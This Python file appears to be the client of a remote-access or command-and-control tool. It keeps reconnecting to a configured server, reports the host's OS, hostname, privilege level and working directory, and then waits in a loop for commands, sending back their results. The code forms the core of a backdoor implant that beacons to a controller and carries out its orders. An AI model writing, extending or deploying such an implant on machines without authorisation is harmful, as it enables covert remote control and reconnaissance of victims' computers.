import os
import platform
import socket
import sys
import time
import uuid

from client.config.config import SERVER_ADDR
from core.utils.client_util.common_util import check_privilege
from client.connection.server_connection import ServerConnection
from core.utils.logger import logger


class Client:
    def __init__(self, address):
        self.address = address
        self.server = ServerConnection()

    def connect(self):
        logger.info(f'Connecting to {self.address}')

        while not self.server.connect(self.address):
            time.sleep(5)
            print('Attempting to reconnect...')
            self.server = ServerConnection()
        info = {
            'id': str(uuid.uuid4()),
            'type': 'info',
            'os_type': platform.system(),
            'os_ver': platform.platform(),
            'hostname': socket.gethostname(),
            'integrity': check_privilege(),
            'cwd': os.getcwd(),
        }
        # 连接到服务器后发送一个验证信息，里面包含服务端的基础信息
        self.server.send(info)
        logger.info('Connected')

    def wait(self):
        while True:
            try:
                result = self.server.recv_command()
                if result:
                    self.server.send_result(*result)
            except SystemExit:
                logger.info('Server closed this connection')
                break
            except socket.error:
                logger.error('Connection closed')
                self.server.close()
                self.server = ServerConnection()
                self.connect()
            except Exception as e:
                logger.error(e)
                self.server.close()
                self.server = ServerConnection()
                self.connect()


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e)
